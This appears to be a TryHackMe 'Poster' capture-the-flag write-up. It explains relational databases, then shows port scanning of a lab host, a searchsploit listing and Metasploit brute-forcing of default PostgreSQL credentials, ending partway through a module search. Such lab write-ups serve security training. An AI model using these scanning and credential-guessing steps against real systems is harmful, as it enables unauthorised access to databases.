---
The sys admin set up a rdbms in a safe way.
---

# Poster — Writeup

## Overview
### Poster — Writeup
### Poster — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/37983213b742f063a0b1fbd37a32d1e1.png)
### What is rdbms?
Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.
Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.
Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.
RDBMS es un sistema de gestión de bases de datos relacionales. Un ejemplo de RDBMS comúnmente utilizado es MySQL.
Un RDBMS almacena datos en forma de tablas, donde cada tabla tiene un conjunto de filas y columnas. Las filas representan registros individuales y las columnas representan atributos de esos registros. Las tablas también pueden relacionarse entre sí mediante claves foráneas, lo que permite a los usuarios consultar y combinar datos de varias tablas de manera sencilla.
Por ejemplo, una base de datos de una empresa podría tener una tabla de empleados y otra tabla de departamentos. La tabla de empleados podría tener una columna llamada "ID de departamento" que se relaciona con la tabla de departamentos mediante una clave foránea. De esta manera, podríamos obtener información sobre los empleados y sus departamentos correspondientes sin tener que almacenar toda la información en una sola tabla.
Are you able to complete the challenge?
The machine may take up to 5 minutes to boot and configure
Answer the questions below

## Enumeration
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.183.253 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.183.253:22
Open 10.10.183.253:80
Open 10.10.183.253:5432
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-24 12:06 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:06
Completed NSE at 12:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:06
Completed NSE at 12:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:06
Completed NSE at 12:06, 0.00s elapsed
Initiating Ping Scan at 12:06
Scanning 10.10.183.253 [2 ports]
Completed Ping Scan at 12:06, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:06
Completed Parallel DNS resolution of 1 host. at 12:06, 0.02s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:06
Scanning 10.10.183.253 [3 ports]
Discovered open port 80/tcp on 10.10.183.253
Discovered open port 22/tcp on 10.10.183.253
Discovered open port 5432/tcp on 10.10.183.253
Completed Connect Scan at 12:06, 0.20s elapsed (3 total ports)
Initiating Service scan at 12:06
Scanning 3 services on 10.10.183.253
Completed Service scan at 12:07, 7.40s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.183.253.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 6.63s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 1.24s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
Nmap scan report for 10.10.183.253
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-12-24 12:06:57 EST for 16s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71ed48af299e30c1b61dffb024cc6dcb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGK2azIgGLY4GFFZlpgMpyOub/To5vmftSEWkjbtFkTBvc5tW/SpoDtjyNMT0JKJUmFJ2/vp6oIpwyIRtDa+oomuNL//exbp/i798hl8FFo4Zq5HsDvQCwNKZ0lfk0HGYgbXj6WAjohokSbkDY1U26FN/MKE2JxcXLcN8n1QmvVbP5p8zO/jgrXvX6DLv4eHxJjhzsBJ6DwFMchtBwy4CiTQsiCUcAyyua93LJO6NEnnM4SOwOUE/wyggCNPbwzB1wzPLAgaiU+M2gn9/XZGmlD+vWOBu3sruCB2PnRuM3cx27gDbbElR4KDIOq2ar66rV+yIZQoQ7KfVUNUFFCbRz
|   256 eb3aa34e6f1000abeffcc52b0edb4057 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN2f/wWkOMnH6rNZ+0m2p+PrzBVbz/vfQ/k9rx9W27i9DLBKmRM2b2ntmg8tSwHhZVTb/FvStJci9SIBLAqao00=
|   256 3e4142353805d392eb4939c6e3ee78de (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYg/uhFbBiQ1iu6NNNYtD/tRDbHmPXw4p/nYv+twijq
80/tcp   open  http       syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql syn-ack PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-29T00:54:25
| Not valid after:  2030-07-27T00:54:25
| MD5:   da573213e9aa9274d0bec1b0bbb20b09
| SHA-1: 4e03846928f7673b2bb204404ba9e4d2a0d05dd5
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAIrmTOUt3qZtMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBnVidW50dTAeFw0yMDA3MjkwMDU0MjVaFw0zMDA3MjcwMDU0MjVaMBExDzAN
| BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMca
| tkPhi1xPkNomQzkTX+XRDk0RPBxRJQm17+Q8sru8J72rToPVyZesM7v5M+ttfqlZ
| sHAevEv/iVb1D6hNPawU9kG61Ja9baHd1s31H7RjWxpMS2vZuiu6/oXNWpc4yinQ
| RDWgLqKhDzczacMWLxKkgh06H8DI04/4pCJ6pbf6gXFfVRrccOu1FmoVlWWdVeGd
| CZ2C8XOA1tEEE6UG9HI9Q2gd3AHOSex+ar3EnWm1LanYDQPJSXEgl/K2A9D5DQEw
| +xJxPnH9abqxUrLUDOxzbMpdqXfb0OHxy7jeBJhpd6DonAZTEACdsgh9SzssH4ac
| FOqjsJjfSzok3x3uBx0CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAxGskqCN0uihEe1rpb7fveGYGMhDsFso9aYdJ4Q3CHJHX3leCN92nLCOq
| R9bTRgVjrvph00jO3+qhHzXCLbnpZXu9R9mPsfcDU/IFCFxMNmjRs4DkkzpGWAyp
| t5I18Zxh4JWJP7Mf1zc39z2Zk/IucAI5kMPMDJUWR/mjVFG/iZY8W+YlKsfvWblU
| tY4RYFhVy9JTVFYe5ZxghLxylYi+cbkGcPMj7qaOkDWIWhILZX1DDAb7cSfVd4rq
| 2ayWhA4Dh/FJkL2j+5mfAku0C7qMAqSlJTMRa6pTQjXeGafLDBoomQIIFnhWOITS
| fohtzsob6PyjssrRoqlRkJLJEJf2YQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.52 seconds
```
```text
┌──(kali㉿kali)-[~]
└─$ searchsploit PostgreSQL             
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
PostgreSQL - 'bitsubstr' Buffer Overflow                                 | linux/dos/33571.txt
PostgreSQL 6.3.2/6.5.3 - Cleartext Passwords                             | immunix/local/19875.txt
PostgreSQL 7.x - Multiple Vulnerabilities                                | linux/dos/25076.c
PostgreSQL 8.01 - Remote Reboot (Denial of Service)                      | multiple/dos/946.c
PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                       | linux/local/7855.txt
PostgreSQL 8.3.6 - Conversion Encoding Remote Denial of Service          | linux/dos/32849.txt
PostgreSQL 8.3.6 - Low Cost Function Information Disclosure              | multiple/local/32847.txt
PostgreSQL 8.4.1 - JOIN Hashtable Size Integer Overflow Denial of Servic | multiple/dos/33729.txt
PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)        | multiple/remote/46813.rb
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)        | multiple/remote/50847.py
PostgreSQL 9.4-0.5.3 - Privilege Escalation                              | linux/local/45184.sh
------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```text
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
```
```text
msf6 > search PostgreSQL

Matching Modules
================
```
```text
#   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   4   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution                                                                  
   5   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution                                                                            
   6   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection                                                            
   7   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility                                                                                        
   8   auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query                                                                                 
   9   auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query                                                                                 
   10  auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe                                                                                        
   11  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution                                                                          
   12  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution                                                              
   13  auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   14  post/linux/gather/vcenter_secrets_dump                      2022-04-15       normal     No     VMware vCenter Secrets Dump

Interact with a module by name or index. For example info 14, use 14 or use post/linux/gather/vcenter_secrets_dump
```
```text
msf6 > use 7
```
```text
msf6 auxiliary(scanner/postgres/postgres_login) > show options

Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting             Required  Description
   ----              ---------------             --------  -----------
   BLANK_PASSWORDS   false                       no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                           yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                   yes       The database to authenticate against
   DB_ALL_CREDS      false                       no        Try each user/password couple stored in the cu
                                                           rrent database
   DB_ALL_PASS       false                       no        Add all passwords in the current database to t
                                                           he list
   DB_ALL_USERS      false                       no        Add all users in the current database to the l
                                                           ist
   DB_SKIP_EXISTING  none                        no        Skip existing credentials stored in the curren
                                                           t database (Accepted: none, user, user&realm)
   PASSWORD                                      no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-fram  no        File containing passwords, one per line
                     ework/data/wordlists/postg
                     res_default_pass.txt
   Proxies                                       no        A proxy chain of format type:host:port[,type:h
                                                           ost:port][...]
   RETURN_ROWSET     true                        no        Set to true to see query result sets
   RHOSTS                                        yes       The target host(s), see https://github.com/rap
                                                           id7/metasploit-framework/wiki/Using-Metasploit
   RPORT             5432                        yes       The target port
   STOP_ON_SUCCESS   false                       yes       Stop guessing when a credential works for a ho
                                                           st
   THREADS           1                           yes       The number of concurrent threads (max one per
                                                           host)
   USERNAME                                      no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-fram  no        File containing (space-separated) users and pa
                     ework/data/wordlists/postg            sswords, one pair per line
                     res_default_userpass.txt
   USER_AS_PASS      false                       no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-fram  no        File containing users, one per line
                     ework/data/wordlists/postg
                     res_default_user.txt
   VERBOSE           true                        yes       Whether to print output for all attempts

View the full module info with the info, or info -d command.
```
```text
msf6 auxiliary(scanner/postgres/postgres_login) > set rhost 10.10.183.253
rhost => 10.10.183.253
```
```text
msf6 auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.183.253:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.183.253:5432 - Login Successful: postgres:password@template1
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```text
msf6 auxiliary(scanner/postgres/postgres_login) > use auxiliary/admin/postgres/postgres_sql
```
```text
msf6 auxiliary(admin/postgres/postgres_sql) > show options

Module options (auxiliary/admin/postgres/postgres_sql):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   DATABASE       template1         yes       The database to authenticate against
   PASSWORD       postgres          no        The password for the specified username. Leave blank for a
                                              random password.
   RETURN_ROWSET  true              no        Set to true to see query result sets
   RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploi
                                              t-framework/wiki/Using-Metasploit
   RPORT          5432              yes       The target port
   SQL            select version()  no        The SQL query to execute
   USERNAME       postgres          yes       The username to authenticate as
   VERBOSE        false             no        Enable verbose output

View the full module info with the info, or info -d command.
```
```text
msf6 auxiliary(admin/postgres/postgres_sql) > set rhost 10.10.183.253
rhost => 10.10.183.253
```
```text
msf6 auxiliary(admin/postgres/postgres_sql) > set password password
password => password
```
```text
msf6 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.183.253

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 2016
    0609, 64-bit

[*] Auxiliary module execution completed
```
```text
msf6 auxiliary(admin/postgres/postgres_sql) > search postgre

Matching Modules
================
```
```text
#   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   4   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   5   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution                                                                  
   7   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution                                                                            
   8   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection                                                            
   9   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility                                                                                        
   10  auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query                                                                                 
